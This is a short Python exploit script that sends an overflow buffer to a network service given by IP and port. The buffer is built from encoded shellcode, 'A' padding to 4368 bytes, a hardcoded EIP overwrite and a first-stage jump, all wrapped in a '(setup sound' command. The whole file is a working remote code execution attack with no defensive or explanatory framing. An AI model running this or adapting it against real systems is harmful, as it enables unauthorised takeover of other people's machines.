#!/usr/bin/python3
import socket
import sys

if len(sys.argv) != 3:
    print("\nUsage: " + sys.argv[0] + " <target ip> <target port>")
    exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

shellcode = ( 
"\xb8\x85\x02\x1b\x58\xdb\xc6\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x12\x83\xc2\x04\x31\x42\x0e\x03\xc7\x0c\xf9\xad\xf6\xcb\x0a"
"\xae\xab\xa8\xa7\x5b\x49\xa6\xa9\x2c\x2b\x75\xa9\xde\xea\x35"
"\x95\x2d\x8c\x7f\x93\x54\xe4\xbf\xcb\xd0\x21\x57\x0e\x1f\xc8"
"\x13\x87\xfe\x7a\x05\xc8\x51\x29\x79\xeb\xd8\x2c\xb0\x6c\x88"
"\xc6\x25\x42\x5e\x7e\xd2\xb3\x8f\x1c\x4b\x45\x2c\xb2\xd8\xdc"
"\x52\x82\xd4\x13\x14")

padding = shellcode + 'A' * (4368 - len(shellcode))
eip = "\x96\x45\x13\x08"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

payload = padding + eip + first_stage
buffer = "\x11(setup sound " + payload + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")

s.connect((host, port))
print(s.recv(1024))

s.send(bytes(buffer, "latin1"))
s.close()

print("[*]Payload Sent!")
